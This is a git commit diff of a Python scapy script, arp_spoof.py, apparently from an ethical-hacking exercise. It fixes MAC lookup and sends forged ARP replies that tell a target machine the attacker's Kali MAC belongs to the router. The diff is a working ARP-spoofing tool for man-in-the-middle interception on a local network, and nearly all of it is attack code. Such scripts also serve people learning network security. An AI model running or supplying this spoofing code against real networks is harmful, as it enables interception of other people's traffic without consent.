a8811b008e479660a5fbea4148cf7fae0eecdecf
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-02-22 07:51:40 +0530

    Bug fixed

--- arp_spoof.py
+++ arp_spoof.py
@@ -4,18 +4,20 @@ import scapy.all as scapy
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.src(arp_request, timeout = 1, verbose = False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    #print(answered_list[0][1].hwsrc)
     return answered_list[0][1].hwsrc
 
 def spoof(target_ip , spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst = target_ip, hwdst= target_mac , psrc = spoof_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
+
     # print(packet.show())
     # print(packet.summary()) To print the content of the packet
     # Send the packet to the target machine giving it the kali's MAC Addresss as the address of thr router
-    scapy.send(packet)
+   
 
-
-get_mac("192.168.1.104")
+get_mac("192.168.0.106")
